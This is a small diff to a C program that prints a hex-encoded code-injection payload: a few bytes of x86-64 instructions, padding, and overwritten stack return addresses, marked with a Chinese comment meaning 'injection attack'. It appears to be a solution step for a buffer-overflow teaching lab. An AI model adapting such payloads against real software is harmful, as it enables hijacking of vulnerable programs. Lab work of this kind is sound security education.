@@ -16,11 +16,11 @@ void print(char *tmp)
 
 int main(void)
 {
-	printf("55 48 c7 c0 ec 40 40 00 48 c7 c3 e8 40 40 00 8b 0b 89 08 68 97 13 40 00 c3 ");
-	for (int i = 25; i < 48; ++i) {
+	printf("48 c7 c0 38 15 0f 0c 68 aa 14 40 00 c3 ");
+	for (int i = 13; i < 48; ++i) {
 		printf("00 ");
 	}
-	print("0000000000000000");
-	print("00007ffffffedee0");//注入攻击
+	print("00007fffffffda70");
+	print("00007fffffffda00");//注入攻击
 	return 0;
 }
